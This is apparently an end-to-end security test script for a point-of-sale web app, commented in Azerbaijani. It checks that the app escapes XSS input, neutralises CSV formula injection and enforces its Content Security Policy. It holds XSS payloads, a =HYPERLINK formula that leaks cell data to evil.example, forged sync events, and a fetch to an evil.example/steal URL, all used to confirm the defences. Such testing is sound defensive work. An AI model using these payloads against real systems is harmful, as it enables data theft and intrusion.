"""XSS / inyeksiya / CSP yoxlaması (real brauzer). İşə salmaq: python3 tests/e2e_xss.py
1) CSP söndürülmüş brauzerdə (bypass_csp) zərərli mətnlər bütün ekranlara düşür: kod İCRA OLUNMAMALI və DOM-a element kimi düşməməlidir
   (yəni qorunma CSP-dən asılı deyil, çıxışın özü təmizlənir).
2) CSV ixracında düstur inyeksiyası (=HYPERLINK...) əvvəlinə ' qoyulur.
3) CSP işləyən brauzerdə inline skript / eval / kənar ünvana sorğu bloklanır, tətbiq isə normal açılır."""
import subprocess, time, sys, os, json, re, urllib.request
from playwright.sync_api import sync_playwright


def wf(pg, expr, timeout=30000):
    """wait_for_function sətri eval ilə işlədir, CSP (script-src 'self') isə eval-ı qadağan edir; ona görə ifadə evaluate ilə dövri yoxlanılır."""
    t0 = time.time()
    while (time.time() - t0) * 1000 < timeout:
        if pg.evaluate('() => !!(' + expr + ')'): return
        pg.wait_for_timeout(50)
    raise TimeoutError('gözlənilən şərt yerinə yetmədi: ' + expr[:100])

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.environ.get('SHOTS', '/tmp/shots')
os.makedirs(OUT, exist_ok=True)
WEB, MOCK = 8771, 8791
URL = 'https://script.google.com/macros/s/AKfycbXSS/exec'
TOKEN = 'e2e-token'
web = subprocess.Popen([sys.executable, '-m', 'http.server', str(WEB), '-d', ROOT], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
gas = subprocess.Popen(['node', os.path.join(ROOT, 'tests', 'gas-server.js'), str(MOCK)], stdout=subprocess.PIPE)
gas.stdout.readline()
errors, ok = [], []
def check(cond, msg): (ok if cond else errors).append(msg)

P = '<img src=x onerror="window.__xss=1">'
P2 = '"><svg onload=window.__xss=2>'
P3 = "</script><script>window.__xss=3</script>"
FORMULA = '=HYPERLINK("http://evil.example/?"&A1,"klik")'

DETECT = """() => ({
  x: window.__xss || 0,
  bad: document.querySelectorAll('img[src="x"], [onerror], [onload], iframe, object, embed, svg[onload]').length,
  scripts: Array.from(document.scripts).filter(s => !s.src).length })"""

def post(items):
    body = json.dumps({'action': 'sync', 'token': TOKEN, 'device': 'evil_dev', 'since': 0, 'items': items, 'limit': 1}).encode()
    return json.loads(urllib.request.urlopen(urllib.request.Request(f'http://127.0.0.1:{MOCK}/', data=body, method='POST')).read())

def proxy(route, request):
    data = request.post_data.encode() if request.method == 'POST' else None
    body = urllib.request.urlopen(urllib.request.Request(f'http://127.0.0.1:{MOCK}/', data=data, method=request.method)).read()
    route.fulfill(status=200, body=body, headers={'access-control-allow-origin': '*', 'content-type': 'application/json'})

def new_ctx(b, **kw):
    ctx = b.new_context(viewport={'width': 1440, 'height': 900}, timezone_id='Asia/Baku', accept_downloads=True, **kw)
    ctx.route('https://script.google.com/**', proxy)
    ctx.add_init_script('window.__printed = 0; window.print = function(){ window.__printed++; };')
    return ctx

def clean(pg, where):
    r = pg.evaluate(DETECT)
    check(r['x'] == 0 and r['bad'] == 0 and r['scripts'] == 0, f'{where}: kod icra olunmadı, DOM-a element düşmədi ({r})')

try:
    with sync_playwright() as p:
        b = p.chromium.launch()

        # ---------- 1) CSP-siz brauzer: çıxışın özü təmizlənir ----------
        ctx = new_ctx(b, bypass_csp=True)
        pg = ctx.new_page()
        pg.on('pageerror', lambda e: errors.append('JS xətası: ' + str(e)))
        pg.goto(f'http://localhost:{WEB}/index.html'); pg.wait_for_selector('.users button')
        pg.click('#connect-btn'); pg.fill('#c-url', URL); pg.fill('#c-tok', TOKEN)
        pg.get_by_role('button', name='Qoş və yüklə').click(); pg.wait_for_selector('.modal-back', state='detached')
        pg.get_by_role('button', name='Admin Admin').click(); pg.fill('#pin', '1234'); pg.keyboard.press('Enter')
        pg.wait_for_selector('#op'); pg.fill('#op', '1234'); pg.fill('#np1', '4827'); pg.fill('#np2', '4827')
        pg.get_by_role('button', name='Saxla və davam et').click(); pg.wait_for_selector('nav')

        seed = pg.evaluate("""async ([P, P2, P3, F]) => {
          const S = Services, out = { errors: [] };
          const t = async (n, fn) => { try { return await fn(); } catch (e) { out.errors.push(n + ': ' + e.message); } };
          const sup = await t('supplier', () => S.createSupplier({ name: P, phone: P2, note: P3 }));
          const sup2 = await t('supplier2', () => S.createSupplier({ name: F, phone: '+994 50 123 45 67', note: 'x' }));
          const prod = (await t('product', () => S.createProduct({ name: P, category: P2, brand: P3, ageGroup: P, mfrBarcode: '<img/src=x/onerror=window.__xss=4>', price: 1000, cost: 500, minStock: 1 })) || {}).product;
          const prod2 = (await t('product2', () => S.createProduct({ name: F, category: 'x', brand: 'y', ageGroup: 'z', price: 700, cost: 300, minStock: 0 })) || {}).product;
          if (prod && sup) await t('receive', () => S.receiveStock(prod.id, 20, 500, P3, sup.id));
          if (prod2 && sup2) await t('receive2', () => S.receiveStock(prod2.id, 20, 300, F, sup2.id));
          const st = await S.storeInfo();
          await t('store', () => S.setStoreInfo(Object.assign({}, st, { name: P, voen: P2, address: P3 })));
          await t('user', () => S.createUser({ name: P.slice(0, 40), role: 'kassir' }));
          await t('approval', () => S.requestApproval('line_delete', 'pos.line.delete', P, null, null));
          return { out, codes: { a: prod && prod.storeBarcode, b: prod2 && prod2.storeBarcode }, ids: { p: prod && prod.id, s: sup && sup.id } };
        }""", [P, P2, P3, FORMULA])
        check(not seed['out']['errors'], 'zərərli mətnlərlə yaradılma xətasız keçdi (servis rədd etməyib): ' + '; '.join(seed['out']['errors'])[:300])
        check(bool(seed['codes']['a']) and bool(seed['codes']['b']), 'məhsullar yaradıldı')
        if not (seed['codes']['a'] and seed['codes']['b']): print('SEED:', seed); raise SystemExit(1)
        pg.get_by_role('navigation').get_by_role('button', name='Kassa').click()
        pg.fill('#open-cash', '50,00'); pg.get_by_role('button', name='Növbəni aç').click(); pg.wait_for_selector('#scan')
        clean(pg, 'Kassa (növbə açıq)')

        # satış: iki məhsul (biri zərərli ad, biri düstur adı)
        for code in (seed['codes']['a'], seed['codes']['b']):
            pg.fill('#scan', code); pg.keyboard.press('Enter'); pg.wait_for_timeout(200)
        clean(pg, 'Kassa (səbət)')
        pg.keyboard.press('F1'); pg.wait_for_selector('#pay-cash'); pg.fill('#pay-cash', '100'); clean(pg, 'Kassa (ödəniş pəncərəsi)')
        pg.keyboard.press('Enter'); wf(pg, 'window.__printed >= 1', timeout=15000)
        clean(pg, 'Çek çapı sonrası')
        printed = pg.inner_text('#print-area')
        check('<img' in printed and 'onerror' in printed, 'çekdə zərərli mətn DÜZ MƏTN kimi görünür (HTML kimi yox)')
        check(pg.evaluate("() => document.querySelectorAll('#print-area img, #print-area svg[onload]').length") == 0, 'çek çap sahəsində zərərli <img> elementi yoxdur')

        # başqa cihazdan gələn saxta hadisələr (hücumçu serverə birbaşa yazır)
        at = time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
        n = [0]
        def ev(typ, data, uid='u_menecer'):
            n[0] += 1
            return {'id': f'{at}_{n[0]:06d}_a_xss{n[0]}', 'at': at, 'type': typ, 'userId': uid, 'device': 'evil_dev', 'data': data}
        items = [
            ev('approval.requested', {'approval': {'id': 'ap_evil1', 'kind': 'stock.receive', 'perm': 'stock.receive', 'status': 'pending', 'summary': P, 'tk': P2, 'tp': [P, P2, 1], 'at': at,
                 'device': 'evil_dev', 'requestedBy': {'id': 'u_kassir', 'name': P}, 'payload': {'productId': seed['ids']['p'], 'productName': P, 'qty': 3, 'supplierId': seed['ids']['s'], 'supplierName': P2, 'note': P3}}}),
            ev('approval.requested', {'approval': {'id': 'ap_evil2', 'kind': 'line_delete', 'perm': 'pos.line.delete', 'status': 'pending', 'summary': P3, 'at': at, 'device': 'evil_dev', 'requestedBy': {'id': 'u_kassir', 'name': P2}}}),
            ev('sale.created', {'sale': {'id': 's_evil1', 'receiptNo': 777001, 'receiptBarcode': '2900777001003', 'at': at, 'shiftId': 'sh_evil', 'cashierId': 'u_kassir', 'cashierName': P,
                 'lines': [{'productId': seed['ids']['p'], 'name': P2, 'storeBarcode': P, 'qty': 1, 'price': 1000, 'unitCost': 500}], 'totals': {'subtotal': 1000, 'discount': 100, 'total': 900},
                 'discount': {'percent': 10, 'approvedBy': 'u_menecer', 'approvedByName': P3}, 'payment': {'method': 'cash', 'cashPart': 900, 'bankPart': 0, 'cashReceived': 900, 'change': 0}, 'offline': False, 'fiscal': {'id': None, 'status': 'disabled'}}}),
            ev('supplier.upserted', {'supplier': {'id': 's_evil', 'name': P3, 'phone': P, 'note': P2, 'active': True, 'updatedAt': at}}),
            ev('product.created', {'product': {'id': 'p_evil', 'name': P2, 'category': P, 'brand': P3, 'ageGroup': P2, 'storeBarcode': '2099999999998', 'mfrBarcode': P, 'price': 100, 'avgCost': 0, 'lastCost': 0, 'stock': 0, 'minStock': 0, 'active': True, 'createdAt': at, 'updatedAt': '1970-01-01T00:00:00.000Z'}}),
            ev('user.upserted', {'user': {'id': 'u_evil', 'name': P, 'role': 'menecer', 'salt': 'a', 'pinHash': 'b', 'active': True, 'mustChangePin': True, 'updatedAt': at}, 'reason': 'created'}, 'u_admin'),
            ev('cash.in', {'move': {'id': 'cm_evil', 'shiftId': 'sh_evil', 'type': 'in', 'amount': 100, 'reason': P, 'at': at, 'userId': 'u_menecer', 'approvedBy': P}}),
        ]
        r = post(items); check(r.get('ok') is True, 'saxta hadisələr serverə yazıldı (hücum modeli)')
        pg.evaluate("() => Sync.cycle()"); pg.wait_for_timeout(800)
        got = pg.evaluate("() => Promise.all([DB.get('approvals','ap_evil1'), DB.get('sales','s_evil1'), DB.get('products','p_evil'), DB.get('suppliers','s_evil'), DB.get('users','u_evil')]).then(r => r.map(x => !!x))")
        check(all(got), f'saxta məlumat cihaza çatdı və saxlandı (yoxlama keçən quruluşlu hadisələr): {got}')

        # bütün ekranlar
        names = pg.eval_on_selector_all('nav button', 'els => els.map(e => e.textContent.trim())')
        check(len(names) >= 6, f'menyu ekranları: {names}')
        for nm in names:
            pg.get_by_role('navigation').get_by_role('button', name=nm, exact=True).click(); pg.wait_for_timeout(500)
            clean(pg, f'ekran «{nm}»')
        # məhsullar: axtarış, düzəliş pəncərəsi, qəbul pəncərəsi, etiket çapı
        pg.get_by_role('navigation').get_by_role('button', name='Məhsullar').click(); pg.wait_for_timeout(300)
        pg.fill('#pq', 'img'); pg.wait_for_timeout(300); clean(pg, 'Məhsullar (axtarış)')
        check(pg.locator('tbody tr').count() >= 1, 'zərərli adlı məhsul siyahıda mətn kimi görünür')
        for label in ('Düzəliş', 'Qəbul', 'Etiket'):
            btn = pg.get_by_role('button', name=re.compile(label)).first
            if btn.count():
                btn.click(); pg.wait_for_timeout(400); clean(pg, f'Məhsullar → {label} pəncərəsi')
                if pg.locator('.modal-back').count(): pg.keyboard.press('Escape'); pg.wait_for_timeout(200)
        # təchizatçılar: hesabat, məhsul siyahısı
        pg.get_by_role('navigation').get_by_role('button', name='Təchizatçılar').click(); pg.wait_for_timeout(600); clean(pg, 'Təchizatçılar')
        # menecer təsdiq pəncərəsi (Sorğular)
        btn = pg.get_by_role('button', name=re.compile('Sorğular'))
        check(btn.count() >= 1, '«Sorğular» düyməsi görünür (gözləyən saxta sorğular)')
        if btn.count():
            btn.first.click(); pg.wait_for_selector('.modal-back'); pg.wait_for_timeout(300)
            clean(pg, 'Sorğular pəncərəsi')
            txt = pg.inner_text('.modal-back')
            check('onerror' in txt or '<img' in txt, 'sorğuda zərərli mətn düz mətn kimi göstərilir')
            pg.screenshot(path=f'{OUT}/xss-approvals.png')
            pg.keyboard.press('Escape')
        # çek və etiket HTML-i: ayrıca DOM-da ayrışdırılır
        res = pg.evaluate("""async () => {
          const sales = await DB.getAll('sales'), prods = await DB.getAll('products'), store = await Services.storeInfo();
          const bad = (html) => { const d = new DOMParser().parseFromString(html, 'text/html'); return d.querySelectorAll('img[src="x"], [onerror], [onload], script, iframe').length; };
          return { r: sales.map(s => bad(Print.receiptHtml(s, store, { reprint: true }))), l: bad(Print.labelsHtml(prods.map(p => ({ product: p, count: 1 })))), n: sales.length, s: store.name };
        }""")
        check(res['n'] >= 2 and all(x == 0 for x in res['r']) and res['l'] == 0, f'çek ({res["n"]} ədəd) və etiket HTML-ində icra olunan element yoxdur ({res})')

        # CSV ixracı: düstur inyeksiyası
        pg.get_by_role('navigation').get_by_role('button', name='Təchizatçılar').click(); pg.wait_for_selector('#rp-csv'); pg.wait_for_timeout(500)
        with pg.expect_download() as dl:
            pg.click('#rp-csv')
        path = dl.value.path(); csv = open(path, encoding='utf-8-sig').read()
        cells = [c for line in csv.split('\r\n') for c in line.split(';')]
        danger = [c for c in cells if re.match(r'^"?[=+@\t\r]', c) and not re.match(r'^"?[+-]?[\d\s.,]*"?$', c)]
        check('HYPERLINK' in csv, 'CSV-də düstur mətni var (ixrac işləyir)')
        check(not danger, f'CSV-də qorunmamış düstur xanası yoxdur: {danger[:3]}')
        check("'=HYPERLINK" in csv, 'düstur adının əvvəlinə \' qoyulub')
        check('+994 50 123 45 67' in csv or '+994' not in csv, 'telefon nömrəsi toxunulmaz qalır')
        ctx.close()

        # ---------- 2) CSP işləyən brauzer ----------
        ctx = new_ctx(b)
        pg = ctx.new_page()
        viol = []
        pg.expose_function('__viol', lambda v: viol.append(v))
        pg.add_init_script("document.addEventListener('securitypolicyviolation', e => window.__viol(e.violatedDirective + ' ' + e.blockedURI));")
        csp_console = []
        pg.on('console', lambda m: csp_console.append(m.text) if 'Content Security Policy' in m.text else None)
        pg.on('pageerror', lambda e: errors.append('JS xətası (CSP): ' + str(e)))
        pg.goto(f'http://localhost:{WEB}/index.html'); pg.wait_for_selector('.users button')
        check(pg.locator('.users button').count() >= 3, 'CSP altında tətbiq normal açılır (giriş ekranı)')
        check(len(viol) == 0, f'normal açılışda CSP pozuntusu yoxdur: {viol}')
        r = pg.evaluate("""async () => {
          const o = {};
          document.body.insertAdjacentHTML('beforeend', '<img src="x" onerror="window.__csp=1">');
          const s = document.createElement('script'); s.textContent = 'window.__csp=2'; document.body.appendChild(s);
          try { o.evalRes = eval('1+1'); } catch (e) { o.evalErr = e.name; }
          try { o.fn = new Function('return 3')(); } catch (e) { o.fnErr = e.name; }
          try { await fetch('https://evil.example/steal', { method: 'POST', body: 'x', mode: 'no-cors' }); o.fetched = true; } catch (e) { o.fetchErr = e.name; }
          const f = document.createElement('iframe'); f.src = 'https://evil.example/'; document.body.appendChild(f);
          await new Promise(r => setTimeout(r, 500));
          o.csp = window.__csp || 0;
          return o;
        }""")
        check(r['csp'] == 0, f'inline hadisə/skript işləmir (CSP): {r}')
        # eval-in dinamik yoxlaması Playwright-da mümkün deyil (CDP-dən çağırılan eval CSP-ni keçir), ona görə siyasətin özü yoxlanır
        meta = re.search(r'Content-Security-Policy"\s+content="([^"]+)"', open(os.path.join(ROOT, 'index.html'), encoding='utf8').read()).group(1)
        d = {x.split()[0]: x.split()[1:] for x in meta.split(';') if x.strip()}
        check(d.get('script-src') == ["'self'"] and d.get('default-src') == ["'none'"] and d.get('object-src') == ["'none'"] and d.get('base-uri') == ["'none'"], f'CSP: script-src yalnız \'self\' ({d.get("script-src")}), unsafe-eval/unsafe-inline yoxdur')
        check("'unsafe-eval'" not in meta and not re.search(r"script-src[^;]*unsafe-inline", meta), "CSP-də script üçün 'unsafe-*' yoxdur")
        check('fetchErr' in r and 'fetched' not in r, 'kənar ünvana (evil.example) sorğu bloklanır')
        check(any('script-src' in v for v in viol) and any('connect-src' in v for v in viol) and any('frame' in v or 'default-src' in v for v in viol), f'CSP pozuntuları qeydə alınıb: {viol[:6]}')
        # Google Apps Script ünvanına sorğu icazəlidir (CSP onu bloklamır): bağlantı yoxlaması keçir
        pg.click('#connect-btn'); pg.fill('#c-url', URL); pg.fill('#c-tok', TOKEN)
        viol.clear(); pg.get_by_role('button', name='Qoş və yüklə').click(); pg.wait_for_selector('.modal-back', state='detached', timeout=20000)
        check(not [v for v in viol if 'google' in v], f'script.google.com sorğusu CSP tərəfindən bloklanmır: {viol}')
        check(pg.evaluate("() => Sync.endpoint()") is not None, 'server qoşuldu')
        ctx.close()
        b.close()
finally:
    web.terminate(); gas.terminate()

print('\n'.join('✓ ' + m for m in ok))
if errors: print('\n'.join('✗ ' + m for m in errors))
print(f'\n{len(ok)} keçdi, {len(errors)} uğursuz')
sys.exit(1 if errors else 0)
